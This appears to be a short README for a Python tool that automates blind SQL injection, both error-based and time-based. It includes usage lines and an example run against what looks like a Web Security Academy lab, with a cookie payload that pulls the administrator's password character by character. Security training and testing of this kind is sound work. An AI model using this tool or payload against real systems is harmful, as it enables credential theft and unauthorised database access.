Auto BLIND SQL INJECTION TOOL BY Xifeng2009

Specify ^PAYLOAD^ in url/cookie/header , this script will replace it with payload
Require: your own payload, the script will format payload with guessed password where {}{} is found

Blind SQL Injection Based on Error
python3 blindSQLman.py -u [URL] [-c [COOKIE]] -D [DIFF] 
Blind SQL Injection Based on Time
python3 blindSQLman.py -u [URL] [-c [COOKIE]] --tech T -D [DIFF] [--timeout 5]

EXAMPLE:
    python3 blindSQLman.py -u https://ac7d1fba1e422a3ac0ad8e3800f20085.web-security-academy.net/filter?category=Gifts -c "TrackingId=Clv6J8Q4AjAffZhD^PAYLOAD^; session=dGVP3Aje0wspCVHJzYpBV0YluhL4o623" -p "' and (select password from users where username='administrator') like '{}{}%25'---" -D "Welcome back!"